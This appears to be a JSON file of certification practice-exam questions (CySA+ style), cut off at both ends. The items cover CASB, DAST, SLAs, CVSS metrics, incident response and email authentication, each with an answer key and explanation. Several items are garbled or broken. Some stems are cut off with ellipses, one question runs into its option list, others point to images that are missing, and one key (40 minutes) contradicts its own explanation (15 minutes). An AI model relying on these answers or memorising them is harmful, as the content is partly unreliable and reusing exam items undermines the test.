    "question": "When undertaking a cloud migration of multiple SaaS application, an organizations system\nadministrator struggled … identity and access management to cloud-based assets. Which of the\nfollowing service models would have reduced the complexity of this project?",
    "options": [
      "A. CASB",
      "B. SASE",
      "C. ZTNA",
      "D. SWG"
    ],
    "answer": "A",
    "explanation": "A Cloud Access Security Broker (CASB) would have reduced the complexity of identity and access\nmanagement in cloud-based assets. CASBs provide visibility into cloud application usage, data\nprotection, and governance for cloud-based services.",
    "image": null
  },
  {
    "id": "q-jc-258",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A Chief Information Security Officer wants to implement security by design, starting ……\nvulnerabilities, including SQL injection, FRI, XSS, etc. Which of the following would most likely meet\nthe requirement?",
    "options": [
      "A. Reverse engineering",
      "B. Known environment testing",
      "C. Dynamic application security testing",
      "D. Code debugging"
    ],
    "answer": "C",
    "explanation": "Dynamic Application Security Testing (DAST) is used to detect vulnerabilities in running applications,\nincluding common issues like SQL injection, FRI, XSS, etc. It aligns with the goal of implementing\nsecurity by design.",
    "image": null
  },
  {
    "id": "q-jc-259",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "Several critical bugs were identified during a vulnerability scan. The SLA risk requirement is that all\ncritical vulnerabilities should be patched within 24 hours. After sending a notification to the asset\nowners, the patch cannot be deployed due to planned, routine system upgrades Which of the\nfollowing is the best method to remediate the bugs?",
    "options": [
      "A. Reschedule the upgrade and deploy the patch",
      "B. Request an exception to exclude the patch from installation",
      "C. Update the risk register and request a change to the SLA",
      "D. Notify the incident response team and rerun the vulnerability scan"
    ],
    "answer": "C",
    "explanation": "When a patch cannot be deployed due to conflicting routine system upgrades, updating the risk\nregister and requesting a change to the Service Level Agreement (SLA) is a practical approach. It\nallows for re-evaluation of the risk and adjustment of the SLA to reflect the current situation.",
    "image": null
  },
  {
    "id": "q-jc-260",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "Which of the following would likely be used to update a dashboard that integrates…..",
    "options": [
      "A. Webhooks",
      "B. Extensible Markup Language",
      "C. Threat feed combination",
      "D. JavaScript Object Notation"
    ],
    "answer": "D",
    "explanation": "JavaScript Object Notation (JSON) is commonly used for transmitting data in web applications and\nwould be suitable for updating dashboards that integrate various data sources. It's lightweight and\neasy to parse and generate.",
    "image": null
  },
  {
    "id": "q-jc-261",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "Which of the following would eliminate the need for different passwords for a variety or internal\napplication?",
    "options": [
      "A. CASB",
      "B. SSO",
      "C. PAM",
      "D. MFA"
    ],
    "answer": "B",
    "explanation": "Single Sign-On (SSO) allows users to log in with a single ID and password to access multiple\napplications. It eliminates the need for different passwords for various internal applications,\nstreamlining the authentication process.",
    "image": null
  },
  {
    "id": "q-jc-262",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "A security analyst needs to secure digital evidence related to an incident. The security analyst must\nensure that the accuracy of the data cannot be repudiated. Which of the following should be\nimplemented?",
    "options": [
      "A. Offline storage",
      "B. Evidence collection",
      "C. Integrity validation",
      "D. Legal hold"
    ],
    "answer": "C",
    "explanation": "Integrity validation is the process of ensuring that the digital evidence has not been altered or\ntampered with during collection, acquisition, preservation, or analysis. It usually involves generating\nand verifying cryptographic hashes of the evidence, such as MD5 or SHA-1. Integrity validation is\nessential for maintaining the accuracy and admissibility of the digital evidence in court.",
    "image": null
  },
  {
    "id": "q-jc-263",
    "type": "mcq",
    "multiSelect": true,
    "selectCount": 2,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "Several vulnerability scan reports have indicated runtime errors as the code is executing. The\ndashboard that lists the errors has a command-line interface for developers to check for\nvulnerabilities. Which of the following will enable a developer to correct this issue? (Select two).",
    "options": [
      "A. Performing dynamic application security testing",
      "B. Reviewing the code",
      "C. Fuzzing the application",
      "D. Debugging the code",
      "E. Implementing a coding standard",
      "F. Implementing IDS"
    ],
    "answer": [
      "B",
      "D"
    ],
    "explanation": "B. Reviewing the code and D. Debugging the code are the two methods that address runtime errors during code execution via a command-line interface. Code review (B) involves manually inspecting source code to identify logic errors, unsafe functions, or missing error handling that cause runtime failures. Debugging (D) involves using a debugger or CLI tools to step through execution, inspect variable states, and identify where the code fails at runtime. Dynamic application security testing (A) finds security vulnerabilities, not general runtime errors. Fuzzing (C) sends malformed inputs to find crashes. Coding standards (E) and IDS (F) are preventive controls, not diagnostic tools for existing runtime errors.",
    "image": null
  },
  {
    "id": "q-jc-264",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "During normal security monitoring activities, the following activity was observed:\ncd C:\\Users\\Documents\\HR\\Employees\ntakeown/f .*\nSUCCESS:\nWhich of the following best describes the potentially malicious activity observed?",
    "options": [
      "A. Registry changes or anomalies",
      "B. Data exfiltration",
      "C. Unauthorized privileges",
      "D. File configuration changes"
    ],
    "answer": "C",
    "explanation": "The takeown command is used to take ownership of a file or folder that previously was denied access\nto the current user or group12. The activity observed indicates that someone has taken ownership of\nall files and folders under the C:\\Users\\Documents\\HR\\Employees directory, which may contain\nsensitive or confidential information. This could be a sign of unauthorized privileges, as the user or\ngroup may not have the legitimate right or need to access those files or folders. Taking ownership of\nfiles or folders could also enable the user or group to modify or delete them, which could affect the\nintegrity or availability of the data.",
    "image": null
  },
  {
    "id": "q-jc-265",
    "type": "mcq",
    "multiSelect": true,
    "selectCount": 2,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "An organization has established a formal change management process after experiencing several\ncritical system failures over the past year. Which of the following are key factors that the change\nmanagement process will include in order to reduce the impact of system failures? (Select two).",
    "options": [
      "A. Ensure users the document system recovery plan prior to deployment.",
      "B. Perform a full system-level backup following the change.",
      "C. Leverage an audit tool to identify changes that are being made.",
      "D. Identify assets with dependence that could be impacted by the change.",
      "E. Require diagrams to be completed for all critical systems.",
      "F. Ensure that all assets are properly listed in the inventory management system."
    ],
    "answer": [
      "B",
      "D"
    ],
    "explanation": "B. Perform a full system-level backup following the change and D. Identify assets with dependencies that could be impacted by the change are the two key factors in reducing critical system failures during change management. Identifying dependent assets (D) before implementation prevents cascading failures — a critical step in risk assessment for changes. Performing a full backup (B) after the change ensures a rollback point if unexpected failures occur post-implementation. Documenting recovery plans (A) is important but done pre-change. Auditing changes (C) is detective, not preventive. Requiring diagrams (E) and inventory management (F) are governance tasks, not direct failure-prevention steps.",
    "image": null
  },
  {
    "id": "q-jc-266",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "An analyst reviews a recent government alert on new zero-day threats and finds the following CVE\nmetrics for the most critical of the vulnerabilities:\nCVSS: 3.1/AV:N/AC: L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:U/RL:W/RC:R\nWhich of the following represents the exploit code maturity of this critical vulnerability?",
    "options": [
      "A. E:U",
      "B. S:C",
      "C. RC:R",
      "D. AV:N",
      "E. AC:L"
    ],
    "answer": "A",
    "explanation": "The exploit code maturity of a vulnerability is indicated by the E metric in the CVSS temporal\nscore. The value of U means that no exploit code is available or unknown1. The other options are not\nrelated to the exploit code maturity, but to other aspects of the vulnerability, such as attack vector,\nscope, availability, and complexity1.",
    "image": "images/page_213_img_2.jpeg"
  },
  {
    "id": "q-jc-267",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "An organization's threat intelligence team notes a recent trend in adversary privilege escalation\nprocedures. Multiple threat groups have been observed utilizing native Windows tools to bypass\nsystem controls and execute commands with privileged credentials. Which of the following controls\nwould be most effective to reduce the rate of success of such attempts?",
    "options": [
      "A. Disable administrative accounts for any operations.",
      "B. Implement MFA requirements for all internal resources.",
      "C. Harden systems by disabling or removing unnecessary services.",
      "D. Implement controls to block execution of untrusted applications."
    ],
    "answer": "D",
    "explanation": "Implementing controls to block execution of untrusted applications can prevent privilege escalation\nattacks that leverage native Windows tools, such as PowerShell, WMIC, or Rundll32. These tools can\nbe used by attackers to run malicious code or commands with elevated privileges, bypassing system\nsecurity policies and controls. By restricting the execution of untrusted applications, organizations\ncan reduce the attack surface and limit the potential damage of privilege escalation attacks.",
    "image": "images/page_213_img_2.jpeg"
  },
  {
    "id": "q-jc-268",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A penetration tester is conducting a test on an organization's software development website. The\npenetration tester sends the following request to the web interface:\nWhich of the following exploits is most likely being attempted?",
    "options": [
      "A. SQL injection",
      "B. Local file inclusion",
      "C. Cross-site scripting",
      "D. Directory traversal"
    ],
    "answer": "A",
    "explanation": "SQL injection is a type of attack that injects malicious SQL statements into a web application’s input\nfields or parameters, in order to manipulate or access the underlying database. The request shown in\nthe image contains an SQL injection attempt, as indicated by the “UNION SELECT” statement, which\nis used to combine the results of two or more queries. The attacker is trying to extract information\nfrom the database by appending the malicious query to the original one",
    "image": "images/page_213_img_2.jpeg"
  },
  {
    "id": "q-jc-269",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "An incident responder was able to recover a binary file through the network traffic. The binary file\nwas also found in some machines with anomalous behavior. Which of the following processes most\nlikely can be performed to understand the purpose of the binary file?",
    "options": [
      "A. File debugging",
      "B. Traffic analysis",
      "C. Reverse engineering",
      "D. Machine isolation"
    ],
    "answer": "C",
    "explanation": "Reverse engineering is the process of analyzing a binary file to understand its structure, functionality,\nand behavior. It can help to identify the purpose of the binary file, such as whether it is a malicious\nprogram, a legitimate application, or a library. Reverse engineering can involve various techniques,\nsuch as disassembling, decompiling, debugging, or extracting strings or resources from the binary\nfile123. Reverse engineering can also help to find vulnerabilities, backdoors, or hidden features in the\nbinary file",
    "image": null
  },
  {
    "id": "q-jc-270",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A cybersecurity analyst is tasked with scanning a web application to understand where the scan will\ngo and whether there are URIs that should be denied access prior to more in-depth scanning. Which\nof following best fits the type of scanning activity requested?",
    "options": [
      "A. Uncredentialed scan",
      "B. Discqyery scan",
      "C. Vulnerability scan",
      "D. Credentialed scan"
    ],
    "answer": "B",
    "explanation": "A discovery scan is a type of web application scanning that involves identifying active, internet-facing\nweb applications and their URIs, without performing any intrusive or in-depth tests. This type of scan\ncan help to understand the scope and structure of a web application before conducting more\ncomprehensive vulnerability scans12. Reference: 1: OWASP Vulnerability Scanning Tools 2: CISA Web\nApplication Scanning",
    "image": null
  },
  {
    "id": "q-jc-271",
    "type": "mcq",
    "multiSelect": true,
    "selectCount": 2,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "Which of the following stakeholders are most likely to receive a vulnerability scan report? (Select\ntwo).",
    "options": [
      "A. Executive management",
      "B. Law enforcement",
      "C. Marketing",
      "D. Legal",
      "E. Product owner",
      "F. Systems admininstration"
    ],
    "answer": [
      "A",
      "F"
    ],
    "explanation": "A. Executive management and F. Systems administration are the primary recipients of vulnerability scan reports. Executive management (A) needs high-level summaries of organizational risk posture, compliance status, and resource allocation to make strategic security investment decisions. Systems administration (F) requires detailed technical findings — specific CVEs, affected hosts, severity scores, and remediation steps — to implement patches and configuration fixes. Law enforcement (B) receives reports only during criminal investigations. Marketing (C), Legal (D — for specific compliance matters only), and Product owners (E) are not standard vulnerability report stakeholders.",
    "image": "images/page_216_img_2.jpeg"
  },
  {
    "id": "q-jc-272",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A security analyst reviews the following extract of a vulnerability scan that was performed against\nthe web server:\nWhich of the following recommendations should the security analyst provide to harden the web\nserver?",
    "options": [
      "A. Remove the version information on http-server-header.",
      "B. Disable tcp_wrappers.",
      "C. Delete the /wp-login.php folder.",
      "D. Close port 22."
    ],
    "answer": "A",
    "explanation": "The vulnerability scan shows that the version information is visible in the http-server-header, which\ncan be exploited by attackers to identify vulnerabilities specific to that version. Removing or\nobfuscating this information can enhance security.\nReference: CompTIA CySA+ CS0-003 Certification Study Guide, Chapter 4: Vulnerability Management,\npage 172; CompTIA CySA+ Study Guide: Exam CS0-003, 3rd Edition, Chapter 5: Vulnerability\nManagement, page 223.",
    "image": "images/page_216_img_2.jpeg"
  },
  {
    "id": "q-jc-273",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "A security administrator needs to import Pll data records from the production environment to the\ntest environment for testing purposes. Which of the following would best protect data\nconfidentiality?",
    "options": [
      "A. Data masking",
      "B. Hashing",
      "C. Watermarking",
      "D. Encoding"
    ],
    "answer": "A",
    "explanation": "Data masking is a technique that replaces sensitive data with fictitious or anonymized data, while\npreserving the original format and structure of the data. This way, the data can be used for testing\npurposes without revealing the actual Pll information. Data masking is one of the best practices for\ndata analysis of confidential data1. Reference: CompTIA CySA+ CS0-003 Certification Study Guide,\npage 343; Best Practices for Data Analysis of Confidential Data",
    "image": "images/page_216_img_2.jpeg"
  },
  {
    "id": "q-jc-274",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "A web application team notifies a SOC analyst that there are thousands of HTTP/404 events on the\npublic-facing web server. Which of the following is the next step for the analyst to take?",
    "options": [
      "A. Instruct the firewall engineer that a rule needs to be added to block this external server.",
      "B. Escalate the event to an incident and notify the SOC manager of the activity.",
      "C. Notify the incident response team that a DDoS attack is occurring.",
      "D. Identify the IP/hostname for the requests and look at the related activity."
    ],
    "answer": "D",
    "explanation": "A HTTP/404 error code means that the requested page or resource was not found on the web server.\nThis could be caused by various reasons, such as incorrect URLs, moved or deleted pages, missing\nassets, or server misconfigurations123. The analyst should first identify the source of the requests\nand examine the related activity to determine if they are legitimate or malicious, and what actions\nneed to be taken to resolve the issue. The other options are either premature or irrelevant without\nfurther investigation. Reference: 1: 404 Page Not Found Error: What It Is and How to Fix It 2: 404\nError Code: What Causes Them and How To Fix It 3: About 404 errors and how to Troubleshoot it?",
    "image": null
  },
  {
    "id": "q-jc-275",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A security analyst would like to integrate two different SaaS-based security tools so that one tool can\nnotify the other in the event a threat is detected. Which of the following should the analyst utilize to\nbest accomplish this goal?",
    "options": [
      "A. SMB share",
      "B. API endpoint",
      "C. SMTP notification",
      "D. SNMP trap"
    ],
    "answer": "B",
    "explanation": "An API endpoint is a point of entry for a communication between two different SaaS-based security\ntools. It allows one tool to send requests and receive responses from the other tool using a common\ninterface. An API endpoint can be used to notify the other tool in the event a threat is detected and\ntrigger an appropriate action. SMB share, SMTP notification, and SNMP trap are not suitable for SaaS\nintegration security, as they are either network protocols or email services that do not provide a\ndirect and secure communication between two different SaaS tools. Reference: Top 10 Best SaaS\nSecurity Tools - 2023, What is SaaS Security? A Guide to Everything SaaS Security, 6 Key\nConsiderations for SaaS Integration Security | Prismatic, Introducing Security for Interconnected SaaS\n- Palo Alto Networks",
    "image": null
  },
  {
    "id": "q-jc-276",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "A network analyst notices a long spike in traffic on port 1433 between two IP addresses on opposite\nsides of a WAN connection. Which of the following is the most likely cause?",
    "options": [
      "A. A local red team member is enumerating the local RFC1918 segment to enumerate hosts.",
      "B. A threat actor has a foothold on the network and is sending out control beacons.",
      "C. An administrator executed a new database replication process without notifying the SOC.",
      "D. An insider threat actor is running Responder on the local segment, creating traffic replication."
    ],
    "answer": "C",
    "explanation": "Port 1433 is commonly used by Microsoft SQL Server, which is a database management system. A\nspike in traffic on this port between two IP addresses on opposite sides of a WAN connection could\nindicate a database replication process, which is a way of copying and distributing data from one\ndatabase server to another. This could be a legitimate activity performed by an administrator, but it\nshould be communicated to the security operations center (SOC) to avoid confusion and false alarms.\nReference: CompTIA CySA+ CS0-003 Certification Study Guide, Chapter 3: Security Operations, page\n107; CompTIA CySA+ Study Guide: Exam CS0-003, 3rd Edition, Chapter 4: Security Operations, page\n153.",
    "image": null
  },
  {
    "id": "q-jc-277",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "Which of the following threat actors is most likely to target a company due to its questionable\nenvironmental policies?",
    "options": [
      "A. Hacktivist",
      "B. Organized crime",
      "C. Nation-state",
      "D. Lone wolf"
    ],
    "answer": "A",
    "explanation": "Hacktivists are threat actors who use cyberattacks to promote a social or political cause, such as\nenvironmentalism, human rights, or democracy. They may target companies that they perceive as\nviolating their values or harming the public interest. Hacktivists often use techniques such as\ndefacing websites, launching denial-of-service attacks, or leaking sensitive data to expose or\nembarrass their targets12. Reference: An introduction to the cyber threat environment, page 3; What\nis a Threat Actor? Types & Examples of Cyber Threat Actors, section 2.",
    "image": null
  },
  {
    "id": "q-jc-278",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "An organization's email account was compromised by a bad actor. Given the following Information:\nWhich of the following is the length of time the team took to detect the threat?",
    "options": [
      "A. 25 minutes",
      "B. 40 minutes",
      "C. 45 minutes",
      "D. 2 hours"
    ],
    "answer": "B",
    "explanation": "The threat was detected from the time the emails were sent at 8:30 a.m. to when the recipients\nstarted alerting the organization’s help desk about the email at 8:45 a.m., taking a total of 15\nminutes. The detection time is the time elapsed between the occurrence of an incident and its\ndiscovery by the security team . The other options are either too short or too long based on the given\ninformation. Reference: : Detection Time : Incident Response Metrics: Mean Time to Detect and\nMean Time to Respond",
    "image": "images/page_220_img_2.jpeg"
  },
  {
    "id": "q-jc-279",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A laptop that is company owned and managed is suspected to have malware. The company\nimplemented centralized security logging. Which of the following log sources will confirm the\nmalware infection?",
    "options": [
      "A. XDR logs",
      "B. Firewall logs",
      "C. IDS logs",
      "D. MFA logs"
    ],
    "answer": "A",
    "explanation": "XDR logs will confirm the malware infection because XDR is a system that collects and analyzes data\nfrom multiple sources, such as endpoints, networks, cloud applications, and email security, to detect\nand respond to advanced threats12. XDR can provide a comprehensive view of the attack chain and\nthe context of the malware infection. Firewall logs, IDS logs, and MFA logs are not sufficient to\nconfirm the malware infection, as they only provide partial or indirect information about the network\ntraffic, intrusion attempts, or user authentication. Reference: Cybersecurity Analyst+ - CompTIA,\nXDR: definition and benefits for MSPs| WatchGuard Blog, Extended detection and response -\nWikipedia",
    "image": "images/page_220_img_2.jpeg"
  },
  {
    "id": "q-jc-280",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "During a scan of a web server in the perimeter network, a vulnerability was identified that could be\nexploited over port 3389. The web server is protected by a WA",
    "options": [
      "F. Which of the following best\nrepresents the change to overall risk associated with this vulnerability?",
      "A. The risk would not change because network firewalls are in use.",
      "B. The risk would decrease because RDP is blocked by the firewall.",
      "C. The risk would decrease because a web application firewall is in place.",
      "D. The risk would increase because the host is external facing."
    ],
    "answer": "B",
    "explanation": "Port 3389 is commonly used by Remote Desktop Protocol (RDP), which is a service that allows\nremote access to a system. A vulnerability on this port could allow an attacker to compromise the\nweb server or use it as a pivot point to access other systems. However, if the firewall blocks this port,\nthe risk of exploitation is reduced.\nReference: CompTIA CySA+ CS0-003 Certification Study Guide, Chapter 2: Software and Systems\nSecurity, page 67; CompTIA CySA+ Study Guide: Exam CS0-003, 3rd Edition, Chapter 3: Software and\nSystems Security, page 103.",
    "image": null
  },
  {
    "id": "q-jc-281",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "Which of the following is a commonly used four-component framework to communicate threat actor\nbehavior?",
    "options": [
      "A. STRIDE",
      "B. Diamond Model of Intrusion Analysis",
      "C. Cyber Kill Chain",
      "D. MITRE ATT&CK"
    ],
    "answer": "B",
    "explanation": "The Diamond Model of Intrusion Analysis is a framework that describes the relationship between\nfour components of a cyberattack: adversary, capability, infrastructure, and victim. It helps analysts\nunderstand the behavior and motivation of threat actors, as well as the tools and methods they use\nto compromise their targets12. Reference: Main Analytical Frameworks for Cyber Threat Intelligence,\nsection 4; Strategies, tools, and frameworks for building an effective threat intelligence team, section\n3.",
    "image": "images/page_223_img_2.jpeg"
  },
  {
    "id": "q-jc-282",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "An incident response analyst is taking over an investigation from another analyst. The investigation\nhas been going on for the past few days. Which of the following steps is most important during the\ntransition between the two analysts?",
    "options": [
      "A. Identify and discuss the lessons learned with the prior analyst.",
      "B. Accept all findings and continue to investigate the next item target.",
      "C. Review the steps that the previous analyst followed.",
      "D. Validate the root cause from the prior analyst."
    ],
    "answer": "C",
    "explanation": "Reviewing the steps that the previous analyst followed is the most important step during the\ntransition, as it ensures continuity and consistency of the investigation. It also helps the new analyst\nto understand the current status, scope, and findings of the investigation, and to avoid repeating the\nsame actions or missing any important details. The other options are either less important,\npremature, or potentially biased. Reference: CompTIA CySA+ CS0-003 Certification Study Guide,\nChapter 4: Incident Response and Management, page 191. Incident response best practices and tips,\nTip 1: Always pack a jump bag.",
    "image": "images/page_223_img_2.jpeg"
  },
  {
    "id": "q-jc-283",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A company has decided to expose several systems to the internet, The systems are currently\navailable internally only. A security analyst is using a subset of CVSS3.1 exploitability metrics to\nprioritize the vulnerabilities that would be the most exploitable when the systems are exposed to the\ninternet. The systems and the vulnerabilities are shown below:\nWhich of the following systems should be prioritized for patching?",
    "options": [
      "A. brown",
      "B. grey",
      "C. blane",
      "D. sullivan"
    ],
    "answer": "C",
    "explanation": "The system “blane” with the vulnerability name “snakedoctor” should be prioritized for patching as\nit has a network attack vector (AV:N), low attack complexity (AC:L), and high availability (A:H). These\nmetrics indicate that it would be relatively easy to exploit this vulnerability over the internet, and the\nsystem is highly available. Reference: According to the CVSS v3.1 Specification Document, the\nexploitability metrics for CVSS are Attack Vector, Attack Complexity, Privileges Required, User\nInteraction, and Scope. These metrics measure how the vulnerability is accessed, the complexity of\nthe attack, and the level of interaction and privileges required to exploit the vulnerability. The image\nshows a table with the values of these metrics for each system and vulnerability. Based on these\nvalues, the system “blane” has the highest exploitability score, as it has the most favorable\nconditions for an attacker. The other systems have either a lower attack vector, higher attack\ncomplexity, or lower availability, which make them less exploitable. Therefore, the system “blane”\nshould be patched first.",
    "image": "images/page_223_img_2.jpeg"
  },
  {
    "id": "q-jc-284",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "An organization needs to bring in data collection and aggregation from various endpoints. Which of\nthe following is the best tool to deploy to help analysts gather this data?",
    "options": [
      "A. DLP",
      "B. NAC",
      "C. EDR",
      "D. NIDS"
    ],
    "answer": "C",
    "explanation": "EDR stands for Endpoint Detection and Response, which is a tool that collects and aggregates data\nfrom various endpoints, such as laptops, servers, or mobile devices. EDR helps analysts monitor,\ndetect, and respond to threats and incidents on the endpoints. EDR is more suitable than DLP (Data\nLoss Prevention), NAC (Network Access Control), or NIDS (Network Intrusion Detection System) for\ndata collection and aggregation from endpoints.\nReference: CompTIA CySA+ CS0-003 Certification Study Guide, Chapter 2: Software and Systems\nSecurity, page 75; What Is Data Aggregation? (Examples + Tools), Section: Data Aggregation: How It\nWorks, Subsection: 1. Data Collection.",
    "image": null
  },
  {
    "id": "q-jc-285",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "A security team conducts a lessons-learned meeting after struggling to determine who should\nconduct the next steps following a security event. Which of the following should the team create to\naddress this issue?",
    "options": [
      "A. Service-level agreement",
      "B. Change management plan",
      "C. Incident response plan",
      "D. Memorandum of understanding"
    ],
    "answer": "C",
    "explanation": "An incident response plan (IRP) is a document that defines the roles and responsibilities, procedures,\nand guidelines for responding to a security incident. It helps the security team to act quickly and\neffectively, minimizing the impact and cost of the incident. An IRP should specify who should conduct\nthe next steps following a security event, such as containment, eradication, recovery, and analysis12.\nReference: CompTIA CySA+ CS0-003 Certification Study Guide, page 362; 6 Incident Response Steps\nto Take After a Security Event, section 2.",
    "image": null
  },
  {
    "id": "q-jc-286",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "Using open-source intelligence gathered from technical forums, a threat actor compiles and tests a\nmalicious downloader to ensure it will not be detected by the victim organization's endpoint security\nprotections. Which of the following stages of the Cyber Kill Chain best aligns with the threat actor's\nactions?",
    "options": [
      "A. Delivery",
      "B. Reconnaissance",
      "C. Exploitation",
      "D. Weaponizatign"
    ],
    "answer": "D",
    "explanation": "Weaponization is the stage of the Cyber Kill Chain where the threat actor creates or modifies a\nmalicious tool to use against a target. In this case, the threat actor compiles and tests a malicious\ndownloader, which is a type of weaponized malware. Reference: Cybersecurity 101, The Cyber Kill\nChain: The Seven Steps of a Cyberattack",
    "image": null
  },
  {
    "id": "q-jc-287",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A security analyst has identified a new malware file that has impacted the organization. The malware\nis polymorphic and has built-in conditional triggers that require a connection to the internet. The\nCPU has an idle process of at least 70%. Which of the following best describes how the security\nanalyst can effectively review the malware without compromising the organization's network?",
    "options": [
      "A. Utilize an RDP session on an unused workstation to evaluate the malware.",
      "B. Disconnect and utilize an existing infected asset off the network.",
      "C. Create a virtual host for testing on the security analyst workstation.",
      "D. Subscribe to an online service to create a sandbox environment."
    ],
    "answer": "D",
    "explanation": "A sandbox environment is a safe and isolated way to analyze malware without affecting the\norganization’s network. An online service can provide a sandbox environment without requiring the\nsecurity analyst to set up a virtual host or use an RDP session. Disconnecting and using an existing\ninfected asset is risky and may not provide accurate results. Reference: Malware Analysis: Steps &\nExamples, Dynamic Analysis",
    "image": null
  },
  {
    "id": "q-jc-288",
    "type": "mcq",
    "multiSelect": true,
    "selectCount": 2,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "The Chief Information Security Officer for an organization recently received approval to install a new\nEDR solution. Following the installation, the number of alerts that require remediation by an analyst\nhas tripled. Which of the following should the organization utilize to best centralize the workload for\nthe internal security team? (Select two).",
    "options": [
      "A. SOAR",
      "B. SIEM",
      "C. MSP",
      "D. NGFW",
      "E. XDR",
      "F. DLP"
    ],
    "answer": [
      "A",
      "B"
    ],
    "explanation": "A. SOAR (Security Orchestration, Automation and Response) and B. SIEM (Security Information and Event Management) are the two solutions that complement a new EDR deployment. SIEM aggregates and correlates alerts from the EDR with other log sources (firewalls, AD, cloud) to provide centralized threat visibility and alerting. SOAR automates response playbooks triggered by EDR detections — isolating hosts, blocking IPs, creating tickets — reducing analyst workload. MSP (C) is a managed service provider. NGFW (D) handles network-layer filtering. XDR (E) extends EDR across domains but is a different product category. DLP (F) handles data loss prevention, not incident response orchestration.",
    "image": null
  },
  {
    "id": "q-jc-289",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "Following an attack, an analyst needs to provide a summary of the event to the Chief Information\nSecurity Officer. The summary needs to include the who-what-when information and evaluate the\neffectiveness of the plans in place. Which of the following incident management life cycle processes\ndoes this describe?",
    "options": [
      "A. Business continuity plan",
      "B. Lessons learned",
      "C. Forensic analysis",
      "D. Incident response plan"
    ],
    "answer": "B",
    "explanation": "The lessons learned process is the final stage of the incident management life cycle, where the\nincident team reviews the incident and evaluates the effectiveness of the response and the plans in\nplace. The lessons learned report should include the who-what-when information and any\nrecommendations for improvement123 Reference: 1: What is incident management? Steps, tips, and\nbest practices 2: 5 Steps of the Incident Management Lifecycle | RSI Security 3: Navigating the\nIncident Response Life Cycle: A Comprehensive Guide",
    "image": null
  },
  {
    "id": "q-jc-290",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "An email hosting provider added a new data center with new public IP addresses. Which of the\nfollowing most likely needs to be updated to ensure emails from the new data center do not get\nblocked by spam filters?",
    "options": [
      "A. DKIM",
      "B. SPF",
      "C. SMTP",
      "D. DMARC"
    ],
    "answer": "B",
    "explanation": "SPF (Sender Policy Framework) is a DNS TXT record that lists authorized sending IP addresses for a\ngiven domain. If an email hosting provider added a new data center with new public IP addresses,\nthe SPF record needs to be updated to include those new IP addresses, otherwise the emails from\nthe new data center may fail SPF checks and get blocked by spam filters123 Reference: 1: Use\nDMARC to validate email, setup steps 2: How to set up SPF, DKIM and DMARC: other mail & hosting\nproviders providers 3: Set up SPF, DKIM, or DMARC records for my hosting email",
    "image": null
  },
  {
    "id": "q-jc-291",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "The SOC received a threat intelligence notification indicating that an employee's credentials were\nfound on the dark web. The user's web and log-in activities were reviewed for malicious or\nanomalous connections, data uploads/downloads, and exploits. A review of the controls confirmed\nmultifactor\nauthentication was enabled. Which of the following should be done first to mitigate impact to the\nbusiness networks and assets?",
    "options": [
      "A. Perform a forced password reset.",
